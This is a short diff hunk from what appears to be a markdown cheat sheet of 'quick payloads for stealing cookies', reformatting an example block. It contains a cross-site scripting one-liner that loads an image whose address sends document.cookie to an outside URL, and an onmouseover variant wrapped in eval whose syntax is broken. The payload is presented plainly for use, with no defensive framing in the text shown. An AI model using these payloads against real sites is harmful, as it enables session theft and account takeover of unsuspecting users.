@@ -13,10 +13,8 @@ Some quick payloads for stealing cookies ``o(￣▽￣)ｄ``
 ## General One-Liner (Use this one first)
 ```javascript
 <script>var i=new Image;i.src="[URL]/?"+document.cookie;</script>
-```
-**Example usage of above:**
-```javascript
-onmouseover=eval(var i=new Image;i.src="[URL]/?"+document.cookie;)
+// Example usage of above:
+	onmouseover=eval(var i=new Image;i.src="[URL]/?"+document.cookie;)
 ```
 ## Using ``<img>`` Tag
 ```javascript
